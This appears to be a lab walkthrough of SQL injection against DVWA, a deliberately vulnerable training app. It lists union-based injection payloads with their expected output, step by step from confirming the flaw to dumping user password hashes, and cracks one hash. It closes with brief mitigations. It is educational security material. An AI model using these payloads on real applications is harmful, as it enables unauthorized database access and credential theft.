### Step 1: Prepare DVWA for SQL Injection Exploit.

1. Open your browser and navigate to the DVWA at [http://10.6.6.13](http://10.6.6.13).
2. Enter the credentials: **admin** / **password**.
3. Set DVWA to Low Security.
    1. Click **DVWA Security** in the left pane.
    2. Change the security level to **Low** and click **Submit**.

### Step 1: Check DVWA to see if a SQL Injection Vulnerability is Present.

1. Click **SQL Injection** in the left pane.
2. In the **User ID:** field type **' OR 1=1 #** and click **Submit**.
3. You should receive the output shown below. The output confirms that there is a vulnerability present that permits execution of SQL statements that are entered directly into input fields.

```
ID: ' or 1=1 #  
First name: admin  
Surname: admin

ID: ' or 1=1 #  
First name: Gordon  
Surname: Brown

ID: ' or 1=1 #  
First name: Hack  
Surname: Me

ID: ' or 1=1 #  
First name: Pablo  
Surname: Picasso

ID: ' or 1=1 #  
First name: Bob  
Surname: Smith
```

You have entered an “always true” expression that was executed by the database server. The result is that all entries in the ID field of the database were returned.

### Step 3: Check for Number of Fields in the Query.

1. In the **User ID:** field type **1' ORDER BY 1 #** and click **Submit**.

You should receive the following output:

```
ID: 1' ORDER BY 1#

First name: admin

Surname: admin
```

2. In the **User ID:** field type **1' ORDER BY 2 #** and click **Submit**.

You should receive the following output:

```
ID: 1' ORDER BY 2#

First name: admin

Surname: admin
```

3. In the **User ID:** field type **1' ORDER BY 3** **#** and click **Submit**.

This time you should receive the error **Unknown column '3' in 'order clause'**.

Because the third string returned an error, this tells us the query involves two fields. This is useful information to know as you continue your exploit.

### Step 4: Check for version Database Management System (DBMS).

In the User ID: field type **1' OR 1=1 UNION SELECT 1, VERSION()#** and click **Submit**.

At the end of the output, you should see a result similar to the following:

```
ID: **1' OR 1=1 UNION SELECT 1, VERSION()#**  
First name: admin  
Surname: admin

ID: **1' OR 1=1 UNION SELECT 1, VERSION()#**  
First name: Gordon  
Surname: Brown

ID: **1' OR 1=1 UNION SELECT 1, VERSION()#**  
First name: Hack  
Surname: Me

ID: **1' OR 1=1 UNION SELECT 1, VERSION()#**  
First name: Pablo  
Surname: Picasso

ID: **1' OR 1=1 UNION SELECT 1, VERSION()#**  
First name: Bob  
Surname: Smith

ID: **1' OR 1=1 UNION SELECT 1, VERSION()#**  
First name: 1  
Surname: 5.5.58-0+deb8u1
```

The output **5.5.58-0+deb8u1** indicates the DBMS is MySQL version 5.5.58 running on Debian.

### Step 5: Determine the database name.

So far you have learned that the database is vulnerable, the query involves two fields, and the DDMS is MySQL 5.5.58.

Next, you will attempt obtain more schema information about the database.

In the User ID: field type **1' OR 1=1 UNION SELECT 1, DATABASE()#** and click **Submit**.

At the end of the output, you should see the following result:

```
ID: 1’ OR 1=1 UNION SELECT 1, DATABASE()#

First name: 1

Surname: dvwa
```

This means the name of the database is **dvwa**.

### Step 6: Retrieve table Names from the dvwa database.

1. In the **User ID:** field type:

```
1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
```

2. Click **Submit**.

The output with **First Name: 1** is the table information.

```
ID: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#  
First name: admin  
Surname: admin

ID: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#  
First name: Gordon  
Surname: Brown

ID: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#  
First name: Bob  
Surname: Smith

ID: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#  
First name: 1  
Surname: guestbook

ID: 1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#  
First name: 1  
Surname: users
```

### Step 1: Retrieve column names from the users table.

You will now discover the field names in the users table. This will help you to find information that is useful for the pentest.

1. In the **User ID:** field type:

```
1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
```

2. Click **Submit**.

```
ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#  
First name: 1  
Surname: user

ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#  
First name: 1  
Surname: password

ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#  
First name: 1  
Surname: avatar

ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#  
First name: 1  
Surname: last_login

ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#  
First name: 1  
Surname: failed_login
```

### Step 8: Retrieve the user credentials.

This query will retrieve the users and passwords.

1. In the **User ID:** field type:

```
1' OR 1=1 UNION SELECT user, password FROM users #
```

2. Click **Submit**.

After the list of users, you should see several results with usernames and what appears to be password hashes.

```
ID: 1' OR 1=1 UNION SELECT user, password FROM users #  
First name: admin  
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' OR 1=1 UNION SELECT user, password FROM users #  
First name: gordonb  
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' OR 1=1 UNION SELECT user, password FROM users #  
First name: 1337  
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' OR 1=1 UNION SELECT user, password FROM users #  
First name: pablo  
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' OR 1=1 UNION SELECT user, password FROM users #  
First name: smithy  
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

***MD5***
5f4dcc3b5aa765d61d8327deb882cf99
0d107d09f5bbe40cade3de5c71e9e9b7
*admin*
5f4dcc3b5aa765d61d8327deb882cf99:password

Mitigation methods:
- using parameterized queries (prepared statements) 
- input checking 
- field validation 
- filtering user inputs 
- escaping user input.



